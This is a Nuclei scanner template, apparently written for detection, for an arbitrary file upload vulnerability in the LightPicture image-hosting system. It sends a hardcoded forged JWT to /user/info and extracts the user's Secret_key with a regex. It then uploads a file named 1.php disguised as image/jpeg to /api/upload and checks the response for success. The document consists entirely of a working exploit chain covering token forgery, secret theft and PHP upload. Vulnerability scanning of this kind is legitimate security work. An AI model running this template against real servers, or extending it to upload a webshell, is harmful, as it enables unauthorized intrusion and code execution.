id: LightPicture-upload-upload

info:
  name: LightPicture企业/团队图床系统 upload 接口存在任意文件上传漏洞
  author: LightPicture
  severity: high
  tags: LightPicture

http:
  - raw:
      - |+
        GET /user/info HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
        Accept: application/json, text/plain, */*
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3NzI1OTc2NzAsIm5iZiI6MTc3MjU5NzY3MCwiZXhwIjoxODM1NjY5NjcwLCJ1c2VybmFtZSI6IjEifQ.6wsv4foJay0_DS9wxxvM15s5Jrj5jfG7uOFe1RNt4_8


      - |
        POST /api/upload HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
        Accept: */*
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Content-Type: multipart/form-data; boundary=---------------------------341634313838488804654020562504
        
        -----------------------------341634313838488804654020562504
        Content-Disposition: form-data; name="key"
        
        {{paths}}
        -----------------------------341634313838488804654020562504
        Content-Disposition: form-data; name="file"; filename="1.php"
        Content-Type: image/jpeg
        
        {{randstr_1}}
        -----------------------------341634313838488804654020562504--


    extractors:
      - type: regex
        part: body
        name: paths
        regex:
          - '"Secret_key":"(.*?)",'
        internal: true
        group: 1

    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - '"user_id"'
          - '"storage_id"'
          - '"path"'
        condition: and
    matchers-condition: and
